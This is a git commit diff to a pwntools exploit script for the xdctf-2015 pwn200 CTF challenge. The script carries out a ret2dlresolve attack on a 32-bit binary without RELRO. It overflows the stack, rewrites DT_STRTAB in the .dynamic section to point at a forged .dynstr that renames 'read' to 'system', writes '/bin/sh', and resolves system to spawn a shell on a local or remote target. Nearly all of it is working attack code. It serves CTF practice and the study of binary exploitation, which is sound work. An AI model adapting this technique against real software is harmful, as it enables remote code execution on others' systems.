95ef337ffbea88e8971dccf0bf2593ccf3bd3b8b
leo <hireedleo@gmail.com>
2021-03-25 06:04:47 -0700

    solved 32 bit wihout relro version

--- pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/32/poc_no_relro_32.py
+++ pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/32/poc_no_relro_32.py
@@ -1,5 +1,5 @@
 from pwn import *
-context(os="linxu", arch="i386")
+context(os="linux", arch="i386")
 
 def debug_on():
 	if (args.DEBUG):
@@ -8,10 +8,15 @@ def debug_on():
 g_fname = "./main_no_relro_32"
 g_elf = ELF(g_fname)
 
-if (args.REMOTE):
-	g_io = remote(args.HOST, int(args.PORT))
-else:
+if (args.LOCAL):
 	g_io = process(g_fname)
+else:
+	g_io = remote(args.HOST, int(args.PORT))
+
+def getpid():
+	if (args.LOCAL):
+		print("pid: %d\n", g_io.proc.pid)
+		pause()
 	
 def pwn():
 	padding_len = 0x70
@@ -19,8 +24,40 @@ def pwn():
 	rop.raw(padding_len*'a')
 	dynsec = g_elf.get_section_by_name(".dynamic")
 	dynsec_addr = dynsec.__getitem__("sh_addr")
-	rop.read(0, dynsec.__getitem__(
+	# DT_STRTAB's subscript is 8 (start form 0), and sizeof(Elf32_Dyn)==8 Bytes
+	off_dt_strtab_val = 8 * 8 + 4 # +4 is the offset of Elf32_Dyn.d_un.ptr
+	# modify DT_STRTAB's ptr in ".dynamic" section, make it points to a fake ".dynstr"
+	rop.read(0, dynsec_addr + off_dt_strtab_val, 4)
+	
+	# constructs a fake ".dynstr"(STRTAB) beyond the end of .dynamic segment.
+	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"read", b"system")
+	fake_dynstr_addr = dynsec_addr + 0x200
+	rop.read(0, fake_dynstr_addr, len(fake_dynstr))	
+
+	# modify DT_STRSZ's d_val
+	off_dt_strsz_val = 10 * 8 + 4
+	rop.read(0, dynsec_addr + off_dt_strsz_val, 4)
+	
+	binsh_addr = fake_dynstr_addr + len(fake_dynstr)
+	rop.read(0, binsh_addr, len("/bin/sh\0"))
+
+	rop.raw(0x8048376) # read@plt's 2nd instruction
+	rop.raw(0xdeadbeef) # anywere is ok, we got shell before returning to there.
+	rop.raw(binsh_addr) # where the "/bin/sh\0" locates.
+
+	getpid()
+	g_io.send(rop.chain().ljust(0x100))
+	pause()
+	g_io.send(flat(fake_dynstr_addr))
+	pause()
+	g_io.send(fake_dynstr)
+	pause()
+	g_io.send(flat(len(fake_dynstr)))
+	pause()
+	g_io.send("/bin/sh\0")
+
 	
 if ("__main__" == __name__):
+	debug_on()
 	pwn()
 	g_io.interactive()
